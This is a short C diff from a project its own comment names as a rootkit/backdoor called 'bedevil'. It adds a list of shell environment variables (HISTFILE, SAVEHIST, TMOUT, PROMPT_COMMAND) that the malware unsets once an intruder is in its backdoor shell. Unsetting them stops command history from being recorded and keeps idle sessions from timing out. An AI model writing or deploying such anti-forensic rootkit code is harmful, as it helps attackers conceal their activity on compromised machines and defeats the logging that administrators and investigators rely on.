@@ -1,4 +1,8 @@
-/* unset variables that we definitely do not need or want set */
+/* bedevil unsets the following environment variables when
+ * it detects somebody (you) is in a rootkit/backdoor shell. */
+static char *unset_variables[4] = {"HISTFILE", "SAVEHIST", "TMOUT", "PROMPT_COMMAND"};
+#define UNSET_VARIABLES_SIZE sizeofarray(unset_variables)
+
 void unset_bad_vars(void){
     for(int i = 0; i < UNSET_VARIABLES_SIZE; i++)
         unsetenv(unset_variables[i]);
